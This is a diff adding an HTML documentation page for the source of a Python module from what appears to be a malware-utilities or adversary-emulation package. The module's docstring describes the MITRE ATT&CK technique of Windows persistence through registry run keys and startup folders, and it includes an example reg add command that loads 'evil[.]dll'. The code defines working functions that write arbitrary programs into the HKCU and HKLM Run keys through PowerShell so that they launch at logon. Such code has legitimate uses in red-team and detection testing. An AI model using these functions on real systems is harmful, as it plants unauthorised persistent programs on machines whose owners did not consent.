@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>mwutils.persistence.registry_run_keys_startup_folder &mdash; mwutils 1.0 documentation</title>
+      <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../../../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js"></script>
+        <script src="../../../_static/jquery.js"></script>
+        <script src="../../../_static/underscore.js"></script>
+        <script src="../../../_static/_sphinx_javascript_frameworks_compat.js"></script>
+        <script src="../../../_static/doctools.js"></script>
+        <script src="../../../_static/sphinx_highlight.js"></script>
+        <script src="https://unpkg.com/mermaid@9.4.0/dist/mermaid.min.js"></script>
+        <script>mermaid.initialize({startOnLoad:true});</script>
+    <script src="../../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../../index.html" class="icon icon-home">
+            mwutils
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../README.html">About the Package</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../Documentation.html">Documentation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../Logging.html">Logging</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../modules.html">mwutils</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">mwutils</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="../../index.html">Module code</a></li>
+      <li class="breadcrumb-item active">mwutils.persistence.registry_run_keys_startup_folder</li>
+      <li class="wy-breadcrumbs-aside">
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <h1>Source code for mwutils.persistence.registry_run_keys_startup_folder</h1><div class="highlight"><pre>
+<span></span><span class="sd">&quot;&quot;&quot;Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</span>
+
+<span class="sd">Adversaries may achieve persistence by adding a program to a startup folder or referencing it </span>
+<span class="sd">with a Registry run key. </span>
+<span class="sd">Adding an entry to the &quot;run keys&quot; in the Registry or startup folder will cause the program </span>
+<span class="sd">referenced to be executed when a user logs in. </span>
+<span class="sd">These programs will be executed under the context of the user and will have the </span>
+<span class="sd">account&#39;s associated permissions level.</span>
+
+<span class="sd">Placing a program within a startup folder will also cause that program to execute when </span>
+<span class="sd">a user logs in. </span>
+<span class="sd">There is a startup folder location for individual user accounts as well as a system-wide </span>
+<span class="sd">startup folder that will be checked regardless of which user account logs in. </span>
+<span class="sd">The startup folder path for the current user is </span>
+<span class="sd">`C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`.</span>
+<span class="sd">The startup folder path for all users is </span>
+<span class="sd">`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp`.</span>
+
+<span class="sd">The following run keys are created by default on Windows systems:</span>
+
+<span class="sd">* `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`</span>
+
+<span class="sd">* `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`</span>
+
+<span class="sd">* `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`</span>
+
+<span class="sd">* `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`</span>
+
+<span class="sd">Run keys may exist under multiple hives.</span>
+<span class="sd">The `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx` </span>
+<span class="sd">is also available but is not created by default on Windows Vista and newer. </span>
+<span class="sd">Registry run key entries can reference programs directly or list them as a dependency. </span>
+<span class="sd">For example, it is possible to load a DLL at logon using a &quot;Depend&quot; key with RunOnceEx: </span>
+<span class="sd">`reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d &quot;C:\\temp\\evil[.]dll&quot;`</span>
+
+<span class="sd">The following Registry keys can be used to set startup folder items for persistence:</span>
+
+<span class="sd">* `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce`</span>
+
+<span class="sd">* `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce`</span>
+
+<span class="sd">* `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices`</span>
+
+<span class="sd">* `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices`</span>
+
+<span class="sd">Using policy settings to specify startup programs creates corresponding values in either of </span>
+<span class="sd">two Registry keys:</span>
+
+<span class="sd">* `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run`</span>
+
+<span class="sd">* `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run`</span>
+
+<span class="sd">The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. </span>
+<span class="sd">Most of these actions are under the control of the operating system, but you can also </span>
+<span class="sd">add custom actions here. </span>
+<span class="sd">The `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit` </span>
+<span class="sd">and `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell` </span>
+<span class="sd">subkeys can automatically launch programs.</span>
+
+<span class="sd">Programs listed in the load value of the registry key </span>
+<span class="sd">`HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows` </span>
+<span class="sd">run when any user logs on.</span>
+
+<span class="sd">By default, the multistring BootExecute value of the registry key </span>
+<span class="sd">`HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager` </span>
+<span class="sd">is set to `autocheck autochk *`. </span>
+<span class="sd">This value causes Windows, at startup, to check the file-system integrity of the </span>
+<span class="sd">hard disks if the system has been shut down abnormally. </span>
+<span class="sd">Adversaries can add other programs or processes to this registry value which will </span>
+<span class="sd">automatically launch at boot.</span>
+
+<span class="sd">Adversaries can use these configuration locations to execute malware, such as </span>
+<span class="sd">remote access tools, to maintain persistence through system reboots. </span>
+<span class="sd">Adversaries may also use Masquerading to make the Registry entries look as if they </span>
+<span class="sd">are associated with legitimate programs.</span>
+
+<span class="sd">Mitre: `T1547.001 &lt;https://attack.mitre.org/techniques/T1547/&gt;`_</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">PIPE</span><span class="p">,</span> <span class="n">run</span>
+
+<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+
+<div class="viewcode-block" id="add_registry_entry"><a class="viewcode-back" href="../../../mwutils.persistence.registry_run_keys_startup_folder.html#mwutils.persistence.registry_run_keys_startup_folder.add_registry_entry">[docs]</a><span class="k">def</span> <span class="nf">add_registry_entry</span><span class="p">(</span><span class="n">keyname</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">valuename</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">command</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Adds a entry to the registry.</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        keyname (str): The key where the valuename is added to.</span>
+<span class="sd">        valuename (str): The name of the entry.</span>
+<span class="sd">        command (str): The data for the entry.</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        str: Output of the command.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">reg_type</span> <span class="o">=</span> <span class="s2">&quot;REG_SZ&quot;</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;REG ADD &#39;</span><span class="si">{</span><span class="n">keyname</span><span class="si">}</span><span class="s2">&#39; /v &#39;</span><span class="si">{</span><span class="n">valuename</span><span class="si">}</span><span class="s2">&#39; /t &#39;</span><span class="si">{</span><span class="n">reg_type</span><span class="si">}</span><span class="s2">&#39; /d &#39;</span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s2">&#39; /f&quot;</span>
+
+    <span class="n">completed</span> <span class="o">=</span> <span class="n">run</span><span class="p">(</span>
+        <span class="p">[</span><span class="s2">&quot;powershell&quot;</span><span class="p">,</span> <span class="s2">&quot;-Command&quot;</span><span class="p">,</span> <span class="n">cmd</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="n">completed</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="persist_via_HKCU_key"><a class="viewcode-back" href="../../../mwutils.persistence.registry_run_keys_startup_folder.html#mwutils.persistence.registry_run_keys_startup_folder.persist_via_HKCU_key">[docs]</a><span class="k">def</span> <span class="nf">persist_via_HKCU_key</span><span class="p">(</span><span class="n">valuename</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">command</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Adds a entry to the registry.</span>
+
+<span class="sd">    The command is the value added to the entry.</span>
+
+<span class="sd">    Registry key: `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`</span>
+
+<span class="sd">    Example:</span>
+<span class="sd">        persist_via_registry(&quot;Update&quot;, r&quot;run.exe&quot;)</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        valuename (str): The name of the entry.</span>
+<span class="sd">        command (str): The data of the entry.</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        str: Output of the command.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="n">reg_key</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span>
+    <span class="k">return</span> <span class="n">add_registry_entry</span><span class="p">(</span><span class="n">reg_key</span><span class="p">,</span> <span class="n">valuename</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="persist_via_HKLM_key"><a class="viewcode-back" href="../../../mwutils.persistence.registry_run_keys_startup_folder.html#mwutils.persistence.registry_run_keys_startup_folder.persist_via_HKLM_key">[docs]</a><span class="k">def</span> <span class="nf">persist_via_HKLM_key</span><span class="p">(</span><span class="n">valuename</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">command</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Adds a entry to the registry.</span>
+
+<span class="sd">    The command is the value added to the entry.</span>
+
+<span class="sd">    Registry key: `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`</span>
+
+<span class="sd">    Example:</span>
+<span class="sd">        persist_via_registry(&quot;Update&quot;, r&quot;run.exe&quot;)</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        valuename (str): The name of the entry.</span>
+<span class="sd">        command (str): The data of the entry.</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        str: Output of the command.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">reg_key</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span>
+    <span class="k">return</span> <span class="n">add_registry_entry</span><span class="p">(</span><span class="n">reg_key</span><span class="p">,</span> <span class="n">valuename</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span></div>
+</pre></div>
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2023, wenzelfe.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
